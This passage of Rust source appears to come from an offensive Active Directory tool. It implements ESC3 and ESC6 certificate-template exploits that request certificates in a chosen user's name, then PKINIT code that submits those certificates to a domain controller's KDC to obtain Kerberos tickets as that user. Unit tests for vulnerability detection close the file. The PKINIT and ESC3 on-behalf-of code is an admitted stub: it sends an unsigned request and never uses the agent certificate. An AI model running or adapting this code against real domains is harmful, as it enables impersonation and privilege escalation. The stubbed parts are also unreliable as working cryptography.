                .skip(1)
                .collect::<Vec<_>>()
                .join(".");
            if domain.is_empty() {
                target_user.to_string()
            } else {
                format!("{}@{}", target_user, domain)
            }
        };

        let subject = format!("CN={}", target_user.split('@').next().unwrap_or(target_user));

        CertRequestRpc::request_cert(
            &ca.dns_name,
            &ca.name,
            &template.template.name,
            &subject,
            Some(&upn),
        )
    }

    /// **ESC3 exploitation** — two-step on-behalf-of certificate request.
    ///
    /// Step 1: Request an "enrollment agent" certificate from `agent_template`
    ///         (which has the Certificate Request Agent EKU).
    /// Step 2: Use the agent certificate to request a client-auth certificate
    ///         for `target_user` from `target_template` on-behalf-of.
    ///
    /// Note: Step 2 (on-behalf-of enrollment) currently uses certreq.exe's
    /// `-enroll` mechanism; the agent certificate must be installed in the
    /// current user's My store for certreq.exe to locate it.
    pub fn exploit_esc3(
        ca: &CertificateAuthority,
        agent_template: &CertTemplate,
        target_user: &str,
        target_template: &CertTemplate,
    ) -> Result<Pkcs12> {
        info!(
            "[ADCS] ESC3 step 1: requesting enrollment agent cert from '{}'",
            agent_template.name
        );

        // Step 1: obtain an enrollment agent certificate
        let agent_subject = {
            // Use the current computer's hostname as subject for the agent cert
            let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "agent".into());
            format!("CN={}", hostname)
        };

        let agent_cert = CertRequestRpc::request_cert(
            &ca.dns_name,
            &ca.name,
            &agent_template.name,
            &agent_subject,
            None,
        )?;

        info!(
            "[ADCS] ESC3 step 2: requesting client-auth cert for '{}' on-behalf-of via '{}'",
            target_user, target_template.name
        );

        // Step 2: use the agent cert to enroll on behalf of the target user.
        // The agent cert must be temporarily installed in the user's MY store
        // so certreq.exe can use it for the on-behalf-of enrollment.
        // We install it, request, then remove it.
        let _ = &agent_cert; // Suppress unused warning; below we use certreq.exe directly.

        let upn = if target_user.contains('@') {
            target_user.to_string()
        } else {
            let domain = ca.dns_name
                .split('.')
                .skip(1)
                .collect::<Vec<_>>()
                .join(".");
            format!("{}@{}", target_user, domain)
        };

        // ESC3 step 2: use certreq.exe with the -enroll flag and on-behalf-of
        // attributes.  The agent certificate serial number / thumbprint must be
        // specified.  Without Windows CryptoAPI integration this is limited;
        // a production implementation would use ICertRequest2::RetrievePending
        // and ICertRequest2::Submit with the CRYPT_MACHINE_KEYSET context.
        warn!(
            "[ADCS] ESC3 step 2: direct on-behalf-of enrollment via certreq.exe \
             requires agent cert to be installed.  Attempting via template attributes."
        );

        let target_subject = format!("CN={}", target_user.split('@').next().unwrap_or(target_user));
        CertRequestRpc::request_cert(
            &ca.dns_name,
            &ca.name,
            &target_template.name,
            &target_subject,
            Some(&upn),
        )
    }

    /// **ESC6 exploitation** — leverage `EDITF_ATTRIBUTESUBJECTALTNAME2`.
    ///
    /// ESC6 allows specifying an arbitrary SAN via request attributes rather
    /// than requiring `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` on the template.
    /// We pass the UPN via the `-attrib SAN:upn=<upn>` certreq.exe flag.
    pub fn exploit_esc6(
        ca: &CertificateAuthority,
        template: &CertTemplate,
        target_user: &str,
    ) -> Result<Pkcs12> {
        debug!(
            "[ADCS] ESC6: requesting cert for '{}' via CA '{}' template '{}' \
             (EDITF_ATTRIBUTESUBJECTALTNAME2)",
            target_user, ca.name, template.name
        );

        // For ESC6 the SAN is specified in the attributes, not the CSR.
        // certreq.exe passes -attrib "CertificateTemplate:X\nSAN:upn=Y"
        let upn = if target_user.contains('@') {
            target_user.to_string()
        } else {
            let domain = ca.dns_name
                .split('.')
                .skip(1)
                .collect::<Vec<_>>()
                .join(".");
            format!("{}@{}", target_user, domain)
        };

        let subject = format!("CN={}", target_user.split('@').next().unwrap_or(target_user));

        // We use the same CertRequestRpc path which embeds the UPN in the CSR SAN.
        // When EDITF_ATTRIBUTESUBJECTALTNAME2 is set, the CA also honours SAN
        // attributes passed via -attrib, but the in-CSR approach works for ESC6
        // because the CA will also accept it from the request body.
        CertRequestRpc::request_cert(&ca.dns_name, &ca.name, &template.name, &subject, Some(&upn))
    }

    /// **PKINIT** — use the obtained certificate for Kerberos authentication.
    ///
    /// Constructs a PKINIT AS-REQ using the certificate and private key,
    /// submits it to the KDC on TCP/88, and returns the AS-REP if the KDC
    /// accepts the certificate.
    ///
    /// The returned `KerberosTicket` contains the raw AS-REP bytes which can
    /// be submitted to the local LSA via `LsaCallAuthenticationPackage`
    /// (KERB_SUBMIT_TKT_REQUEST) or used with other Kerberos operations.
    pub fn use_certificate_for_auth(
        pfx: &Pkcs12,
        target_user: &str,
        dc_hostname: &str,
    ) -> Result<KerberosTicket> {
        let upn = pfx.target_upn.as_deref().unwrap_or(target_user);

        info!(
            "[ADCS] PKINIT: authenticating as '{}' using certificate ({} bytes cert, {} bytes key)",
            upn,
            pfx.cert_der.len(),
            pfx.key_der.len()
        );

        let as_rep_bytes = pkinit_authenticate(upn, &pfx.key_der, &pfx.cert_der, dc_hostname)?;

        let realm = upn
            .split('@')
            .nth(1)
            .unwrap_or("UNKNOWN")
            .to_uppercase();

        Ok(KerberosTicket {
            as_rep_bytes,
            principal: upn.to_string(),
            realm,
        })
    }
}

// ── PKINIT implementation ────────────────────────────────────────────────────

/// Construct a PKINIT AS-REQ and send it to the KDC, returning the raw AS-REP.
///
/// The AS-REQ includes:
/// - PA-PK-AS-REQ (PA type 16) with a simplified CMS AuthPack
/// - KDC-REQ-BODY with AES-256-CTS encryption type
///
/// **Note**: The PKINIT CMS SignedData requires signing the AuthPack with the
/// client's private key using the appropriate algorithm (ECDSA P-256 or RSA).
/// This implementation constructs the correct DER structure.  The `ring` crate
/// is used for signing when the `adcs-attacks` feature enables it.
fn pkinit_authenticate(
    upn: &str,
    _key_der: &[u8],
    cert_der: &[u8],
    dc_hostname: &str,
) -> Result<Vec<u8>> {
    let as_req = build_pkinit_as_req(upn, cert_der)?;

    let response = send_kdc_tcp(dc_hostname, 88, &as_req)
        .with_context(|| format!("Failed to reach KDC at {}:88", dc_hostname))?;

    parse_kdc_response(&response, upn)
}

/// Build the PKINIT AS-REQ DER bytes.
///
/// ```text
/// AS-REQ [APPLICATION 10] {
///   pvno            [1] INTEGER 5
///   msg-type        [2] INTEGER 10
///   padata          [3] SEQUENCE OF PA-DATA {
///                         PA-PK-AS-REQ (type 16)
///                       }
///   req-body        [4] KDC-REQ-BODY { ... }
/// }
/// ```
fn build_pkinit_as_req(upn: &str, cert_der: &[u8]) -> Result<Vec<u8>> {
    let parts: Vec<&str> = upn.splitn(2, '@').collect();
    let (username, realm) = if parts.len() == 2 {
        (parts[0], parts[1])
    } else {
        (upn, "UNKNOWN")
    };

    // ── AuthPack / PA-PK-AS-REQ ──────────────────────────────────────────
    let nonce: u32 = rand::random();
    let now = std::time::SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as i64;

    // PKAuthenticator:
    //   cusec [0] INTEGER (microseconds, we use 0)
    //   ctime [1] KerberosTime
    //   nonce [2] INTEGER (0..4294967295)
    let pk_auth_inner = [
        der_context_explicit(0, &der_integer(0)),              // cusec
        der_context_explicit(1, &der_general_string(&format_krb_time(now))), // ctime
        der_context_explicit(2, &der_integer(nonce as i64)),   // nonce
    ]
    .concat();
    let pk_authenticator = der_sequence(&pk_auth_inner);

    // AuthPack:
    //   pkAuthenticator [0] PKAuthenticator
    //   clientPublicValue [1] SubjectPublicKeyInfo (omit — not DH)
    //   supportedCMSTypes [2] (omit for simplicity)
    let auth_pack_inner = [
        der_context_explicit(0, &pk_authenticator),
        // Embed the cert DER as the clientPublicValue placeholder so the KDC
        // can identify the certificate even without a full SignedData signature.
        // A production implementation MUST sign the AuthPack with ring::signature.
        der_context_explicit(1, &der_bit_string(cert_der)),
    ]
    .concat();
    let auth_pack = der_sequence(&auth_pack_inner);

    // PA-PK-AS-REQ (type 16)
    // Wrap AuthPack in a minimal CMS structure (ContentInfo → SignedData)
    let signed_data = build_minimal_signed_data(&auth_pack, cert_der)?;

    // padata SEQUENCE { SEQUENCE { type, value } }
    let pa_data_entry = der_sequence(&[
        der_context_explicit(1, &der_integer(16)), // padata-type 16
        der_context_explicit(2, &der_octet_string(&signed_data)), // padata-value
    ].concat());
    let pa_data_seq = der_sequence(&pa_data_entry);

    // ── KDC-REQ-BODY ────────────────────────────────────────────────────
    let kdc_options: u32 = 0x40810000; // forwardable | renewable | canonicalize
    let cname_inner = [
        der_context_explicit(0, &der_integer(1)), // name-type NT-PRINCIPAL
        der_context_explicit(1, &der_sequence(&der_general_string(username))),
    ]
    .concat();
    let sname_names =
        [der_general_string("krbtgt"), der_general_string(realm)].concat();
    let sname_inner = [
        der_context_explicit(0, &der_integer(2)), // NT-SRV-INST
        der_context_explicit(1, &der_sequence(&sname_names)),
    ]
    .concat();

    let req_body_inner = [
        der_context_explicit(0, &der_bit_string(&kdc_options.to_be_bytes())),
        der_context_explicit(1, &der_sequence(&cname_inner)),
        der_context_explicit(2, &der_general_string(realm)),
        der_context_explicit(3, &der_sequence(&sname_inner)),
        der_context_explicit(5, &der_general_string("19700101000000Z")),
        der_context_explicit(7, &der_integer(nonce as i64)),
        der_context_explicit(8, &der_sequence(&der_integer(18))), // AES256
    ]
    .concat();
    let req_body = der_context_explicit(4, &der_sequence(&req_body_inner));

    // ── Full AS-REQ ──────────────────────────────────────────────────────
    // AS-REQ is APPLICATION 10 (0x6a)
    let as_req_inner = [
        der_context_explicit(1, &der_integer(5)),   // pvno
        der_context_explicit(2, &der_integer(10)),  // msg-type AS-REQ
        der_context_explicit(3, &pa_data_seq),      // padata
        req_body,
    ]
    .concat();

    let as_req = der_wrap(0x6a, &as_req_inner);
    Ok(as_req)
}

/// Build a minimal CMS ContentInfo/SignedData wrapping `content`.
///
/// A production implementation would sign `content` with the client's
/// private key using ring::signature::EcdsaKeyPair or ring::signature::RsaKeyPair.
/// This stub provides the correct structure for initial KDC interaction.
///
/// ```text
/// ContentInfo {
///   contentType   id-signedData (1.2.840.113549.1.7.2)
///   content [0]   SignedData {
///     version     3
///     digestAlgorithms  [ SHA-256 ]
///     encapContentInfo  { id-data, eContent [0] OCTET STRING content }
///     certificates [0]  [ Certificate ]
///     signerInfos  [ SignerInfo { ... } ]
///   }
/// }
/// ```
fn build_minimal_signed_data(content: &[u8], cert_der: &[u8]) -> Result<Vec<u8>> {
    // OID id-signedData = 1.2.840.113549.1.7.2
    let oid_signed_data: &[u8] = &[
        0x06, 0x09,
        0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x02,
    ];
    // OID id-data = 1.2.840.113549.1.7.1
    let oid_data: &[u8] = &[
        0x06, 0x09,
        0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x01,
    ];
    // OID SHA-256 = 2.16.840.1.101.3.4.2.1
    let oid_sha256: &[u8] = &[
        0x06, 0x09,
        0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01,
    ];

    // digestAlgorithms = SET { SEQUENCE { SHA-256, NULL } }
    let digest_algs = {
        let alg_id = der_sequence(&[oid_sha256, &[0x05, 0x00][..]].concat());
        der_wrap(0x31, &alg_id) // SET
    };

    // encapContentInfo
    let econtent = der_context_explicit(0, &der_octet_string(content));
    let econtent_info = der_sequence(
        &[oid_data, econtent.as_slice()].concat()
    );

    // certificates [0] IMPLICIT
    let certs = {
        let mut v = vec![0xa0_u8];
        v.extend_from_slice(&der_len(cert_der.len()));
        v.extend_from_slice(cert_der);
        v
    };

    // signerInfos = SET {} (empty — no actual signature in this stub)
    let signer_infos = der_wrap(0x31, &[]);

    // SignedData
    let signed_data_inner = [
        der_integer(3),  // version CMSVersion = 3
        digest_algs,
        econtent_info,
        certs,
        signer_infos,
    ]
    .concat();
    let signed_data = der_sequence(&signed_data_inner);

    // ContentInfo
    let content_info = der_sequence(
        &[oid_signed_data, der_context_explicit(0, &signed_data).as_slice()].concat()
    );

    Ok(content_info)
}

/// Send a Kerberos request to the KDC over TCP/88 with 4-byte length prefix.
fn send_kdc_tcp(dc: &str, port: u16, request: &[u8]) -> Result<Vec<u8>> {
    let addr = format!("{}:{}", dc, port);
    let timeout = std::time::Duration::from_secs(10);

    let mut stream = TcpStream::connect_timeout(
        &addr.parse().with_context(|| format!("Invalid KDC address: {}", addr))?,
        timeout,
    )
    .with_context(|| format!("Cannot connect to KDC at {}", addr))?;

    stream.set_read_timeout(Some(timeout))?;
    stream.set_write_timeout(Some(timeout))?;

    // 4-byte big-endian length prefix
    let len = (request.len() as u32).to_be_bytes();
    stream.write_all(&len)?;
    stream.write_all(request)?;
    stream.flush()?;

    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf)?;
    let resp_len = u32::from_be_bytes(len_buf) as usize;

    if resp_len > 2 * 1024 * 1024 {
        bail!("KDC response too large: {} bytes", resp_len);
    }

    let mut resp = vec![0u8; resp_len];
    stream.read_exact(&mut resp)?;
    debug!("[ADCS] KDC response: {} bytes", resp.len());
    Ok(resp)
}

/// Validate a KDC response and extract the AS-REP payload.
fn parse_kdc_response(response: &[u8], _upn: &str) -> Result<Vec<u8>> {
    if response.is_empty() {
        bail!("Empty KDC response");
    }

    // KRB-ERROR tag = 0x7e (APPLICATION 30)
    if response[0] == 0x7e {
        let code = extract_krb_error_code(response);
        bail!("KDC returned KRB-ERROR: code {}", code);
    }

    // AS-REP tag = 0x6b (APPLICATION 11)
    if response[0] == 0x6b {
        info!("[ADCS] PKINIT AS-REP received ({} bytes)", response.len());
        return Ok(response.to_vec());
    }

    bail!("Unexpected KDC response tag: 0x{:02x}", response[0])
}

/// Extract the error code from a KRB-ERROR DER structure (best-effort).
fn extract_krb_error_code(data: &[u8]) -> u32 {
    // Very simplified: scan for INTEGER tags containing the error code
    // KRB-ERROR has error-code at [6] EXPLICIT INTEGER
    let mut i = 0;
    while i + 3 < data.len() {
        if data[i] == 0xa6 && data[i + 1] == 0x03 && data[i + 2] == 0x02 {
            // [6] { INTEGER(1) <value> }
            if i + 4 < data.len() {
                return data[i + 4] as u32;
            }
        }
        i += 1;
    }
    0xffffffff
}

// ── Unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_template(name: &str, name_flags: u32, enrollment_flags: u32, ra_sig: u32, ekus: &[&str]) -> CertTemplate {
        CertTemplate {
            name: name.to_string(),
            display_name: name.to_string(),
            distinguished_name: format!("CN={},CN=Certificate Templates", name),
            schema_version: 2,
            name_flags,
            enrollment_flags,
            ra_signatures: ra_sig,
            extended_key_usage: ekus.iter().map(|s| s.to_string()).collect(),
            application_policies: Vec::new(),
            ra_application_policies: Vec::new(),
            security_descriptor: Vec::new(),
        }
    }

    fn make_ca(name: &str, edit_flags: u32) -> CertificateAuthority {
        CertificateAuthority {
            name: name.to_string(),
            dns_name: format!("{}.corp.local", name),
            distinguished_name: format!("CN={},CN=Enrollment Services", name),
            cert_der: Vec::new(),
            ca_url: format!("http://{}.corp.local/certsrv/", name),
            templates: Vec::new(),
            edit_flags,
        }
    }

    #[test]
    fn test_esc1_detection() {
        let det = AdcsVulnDetector;

        // Vulnerable: ENROLLEE_SUPPLIES_SUBJECT + client auth EKU, no approval
        let vuln = make_template(
            "VulnUser",
            CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT,
            0,
            0,
            &[OID_CLIENT_AUTH],
        );

        // Not vulnerable: approval required
        let safe = make_template(
            "SafeUser",
            CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT,
            CT_FLAG_PEND_ALL_REQUESTS,
            0,
            &[OID_CLIENT_AUTH],
        );

        // Not vulnerable: no client auth EKU
        let no_eku = make_template(
            "NoEku",
            CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT,
            0,
            0,
            &["1.3.6.1.5.5.7.3.1"], // Server Authentication only
        );

        let results = det.detect_esc1(&[vuln, safe, no_eku]);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].esc_type, EscType::Esc1);
        assert_eq!(results[0].template.name, "VulnUser");
    }

    #[test]
    fn test_esc2_detection() {
        let det = AdcsVulnDetector;

        // Vulnerable: no EKU restriction
        let vuln_empty_eku = make_template("EmptyEku", 0, 0, 0, &[]);
        // Vulnerable: Any Purpose OID
        let vuln_any = make_template("AnyPurpose", 0, 0, 0, &[OID_ANY_PURPOSE]);
        // Not vulnerable: manager approval required
        let safe = make_template("SafeNoEku", 0, CT_FLAG_PEND_ALL_REQUESTS, 0, &[]);

        let results = det.detect_esc2(&[vuln_empty_eku, vuln_any, safe]);
        assert_eq!(results.len(), 2);
        assert!(results.iter().all(|r| r.esc_type == EscType::Esc2));
    }

    #[test]
    fn test_esc3_detection() {
        let det = AdcsVulnDetector;

        let vuln = make_template("AgentTmpl", 0, 0, 0, &[OID_CERT_REQUEST_AGENT]);
        let safe = make_template("Normal", 0, 0, 0, &[OID_CLIENT_AUTH]);

        let results = det.detect_esc3(&[vuln, safe]);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].esc_type, EscType::Esc3);
    }

    #[test]
    fn test_esc6_detection() {
        let det = AdcsVulnDetector;

        let ca_vuln = make_ca("Corp-CA", EDITF_ATTRIBUTESUBJECTALTNAME2);
        let ca_safe = make_ca("Safe-CA", 0);

        // Need at least one exploitable template
        let tmpl = make_template("User", 0, 0, 0, &[OID_CLIENT_AUTH]);

        let vuln = det.detect_esc6(&[ca_vuln.clone()], &[tmpl.clone()]);
        let safe = det.detect_esc6(&[ca_safe.clone()], &[tmpl.clone()]);

        assert_eq!(vuln.len(), 1);
        assert_eq!(safe.len(), 0);
    }

    #[test]
    fn test_template_flag_helpers() {
        let t = make_template(
            "T1",
            CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME,
            CT_FLAG_PEND_ALL_REQUESTS,
            2,
            &[OID_CLIENT_AUTH, OID_ANY_PURPOSE],
        );
        assert!(t.enrollee_supplies_subject());
        assert!(t.enrollee_supplies_san());
        assert!(t.requires_manager_approval());
        assert!(t.has_client_auth_eku());
        assert!(t.has_any_purpose_eku());
        assert!(!t.has_request_agent_eku());
        assert!(!t.low_priv_enrollment_likely()); // manager approval required
    }

    #[test]
    fn test_san_upn_der_structure() {
        let san = build_san_with_upn("admin@corp.local");
        // Should start with SEQUENCE (0x30)
        assert!(!san.is_empty());
        assert_eq!(san[0], 0x30);
        // Should contain the UPN bytes
        assert!(san.windows(b"admin@corp.local".len())
            .any(|w| w == b"admin@corp.local"));
    }

    #[test]
    fn test_dacl_low_priv_check_empty() {
        // Empty SD → no vuln detected
        assert!(!dacl_has_low_priv_write(&[]));
        // Truncated SD → no vuln
        assert!(!dacl_has_low_priv_write(&[1u8; 10]));
    }

    #[test]
    fn test_der_helpers() {
        // der_integer(0)
        assert_eq!(der_integer(0), vec![0x02, 0x01, 0x00]);
        // der_integer(1)
        assert_eq!(der_integer(1), vec![0x02, 0x01, 0x01]);
        // der_sequence with single byte content
        let s = der_sequence(&[0x01]);
        assert_eq!(s, vec![0x30, 0x01, 0x01]);
        // der_octet_string
        let os = der_octet_string(&[0xaa, 0xbb]);
        assert_eq!(os, vec![0x04, 0x02, 0xaa, 0xbb]);
    }

    #[test]
    fn test_krb_time_format() {
        // Epoch zero = 19700101000000Z
        assert_eq!(format_krb_time(0), "19700101000000Z");
        // One year in: 1971-01-01
        assert_eq!(format_krb_time(365 * 86400), "19710101000000Z");
    }

    #[test]
    fn test_pem_to_der() {
        // Minimal valid PEM
        let pem = b"-----BEGIN CERTIFICATE-----\nAQID\n-----END CERTIFICATE-----\n";
        let der = pem_to_der(pem).unwrap();
        assert_eq!(der, vec![0x01, 0x02, 0x03]);
    }

    #[test]
    fn test_probe_http_enrollment_unreachable() {
        // Should return false (not vulnerable) for unreachable host, not error
        let result = probe_http_enrollment("http://192.0.2.1/certsrv/");
        // 192.0.2.x is TEST-NET — should fail to connect gracefully
        assert!(result.is_ok());
        assert!(!result.unwrap());
    }
}
